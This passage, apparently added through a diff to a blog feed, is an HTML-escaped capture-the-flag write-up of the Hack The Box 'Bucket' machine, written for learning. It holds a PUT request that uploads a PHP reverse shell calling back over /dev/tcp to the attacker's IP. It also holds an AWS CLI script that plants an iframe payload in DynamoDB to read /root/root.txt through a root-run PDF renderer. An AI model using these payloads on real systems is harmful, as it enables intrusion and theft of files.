+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Owner&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;index.html&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2021-03-26T20:45:04.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;dadef349eabdda42a5ff5118a5b9c229&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;5344&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Owner&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;DisplayName&amp;gt;&lt;/span&gt;webfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DisplayName&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Owner&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ListBucketResult&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;The inventory of the adserver bucket.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Consulting the docs again I find that we can use a PUT request to the API to upload any file to the bucket. So I used Burpsuite to create a request containing a reverse shell. After the upload I trigger the shell by visiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://bucket.htb/rev-shell.php&lt;/code&gt; page in the browser. Make sure to catch the shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nlvp 9001&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;PUT&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/adserver/rev-shell.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;s3.bucket.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;82&lt;/span&gt;
+
+&amp;lt;?php system(&quot;/bin/bash -c \&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.134/9001 0&amp;gt;&amp;amp;1\&quot;&quot;) ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;HTTP request for uploading the reverse shell to the S3 bucket.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;post-exploitation&quot;&gt;Post-Exploitation&lt;/h2&gt;
+&lt;p&gt;At this point I have shell access to the machine as the www-data user. I tried reading the user flag located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/roy/user.txt&lt;/code&gt;. However, I did not have permissions to read the file. Going back to the credentials we found earlier I tried to login as the user roy using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; with the password I found for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sysadm&lt;/code&gt; user. Alternatively we can login via SSH using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; as username.&lt;/p&gt;
+
+&lt;p&gt;At this point, I began enumerating the machine again but using our new privileges as the roy user. I used the &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;linpeas.sh&lt;/a&gt; script to enumerate the machine in the background while also doing some manual enumeration.&lt;/p&gt;
+
+&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps aux | grep root&lt;/code&gt; I found another instance of apache running as the root user. So I navigated to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; directory and found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket-app&lt;/code&gt; folder that contained the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; script. The line that triggered me is the line that uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passthru&lt;/code&gt; function, which executes shell commands.&lt;/p&gt;
+
+&lt;p&gt;Since it runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pd4ml_demo.jar&lt;/code&gt; file; I googled it and quickly found that it had be exploited recently (&lt;a href=&quot;https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd&quot;&gt;blog post&lt;/a&gt;). The blog post explains how the program can be used to read arbitrary files. Since it is running as the root user, this seems a good privilege escalation opportunity.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Aws\DynomoDb\DynomoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;get_alerts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'America/New_York'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'region'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'us-east-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'latest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+              &lt;span class=&quot;s1&quot;&gt;'endpoint'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://localhost:4566'&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+      &lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getIterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Scan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'TableName'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alerts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'FilterExpression'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;title = :title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+              &lt;span class=&quot;s1&quot;&gt;'ExpressionAttributeValues'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+      &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+              &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'files/'&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java -Xms512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 800 A4 -out files/result.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; file of the bucket-app.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;By reading the PHP script and the blog post, I created the following plan to obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; flag:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create a table &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Insert a payload to read a file as root&lt;/li&gt;
+  &lt;li&gt;Trigger the web application to generate a report&lt;/li&gt;
+  &lt;li&gt;Quickly copy the report because of aggressive cleanup on the machine&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;I implemented these steps in the script below. Again I was still not familiar with AWS and the CLI interface it provides to interact with DynamoDB so I made heavy use of the examples provided in the &lt;a href=&quot;https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Tools.CLI.html#Tools.CLI.UsingWithDDB&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws dynamodb create-table &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--no-sign-request&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--region&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;us-east-1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://localhost:4566 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; aws dynamodb put-item 
+    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;iframe src=\&quot;file:///root/root.txt\&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&quot;} }'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--no-sign-request&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--region&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;us-east-1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://localhost:4566 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget http://localhost:8000 &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;--post-data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;action=get_alerts&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;files/result.pdf /tmp/.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now open the pdf file to read the flag :)&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the /root/root.txt flag.</summary></entry></feed>
